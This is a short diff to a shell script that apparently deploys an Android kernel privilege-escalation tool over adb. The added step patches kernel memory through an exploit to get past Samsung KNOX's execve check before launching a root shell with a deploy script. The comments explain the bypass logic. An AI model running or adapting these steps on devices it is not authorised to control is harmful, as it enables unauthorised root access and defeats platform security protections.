@@ -40,6 +40,11 @@ adb shell chmod 755 /data/local/tmp/deploy_ktool.sh
 
 # Escalate with the new binary itself. It is shell_data_file, and the `shell`
 # domain has execute there — which is exactly what `adb shell` gives us.
+# Patch first. '-u' removes the exec patch, and without it the KNOX branch in
+# sys_execve refuses pwn's exec of /system/bin/sh — the deploy script would never
+# start. patch only writes kernel memory through the exploit, so it needs no
+# prior root and no working exec.
+adb shell '/data/local/tmp/ktool_new patch' 2>&1 | tail -1
 adb shell '/data/local/tmp/ktool_new pwn /system/bin/sh /data/local/tmp/deploy_ktool.sh'
 
 echo "== 终态 =="
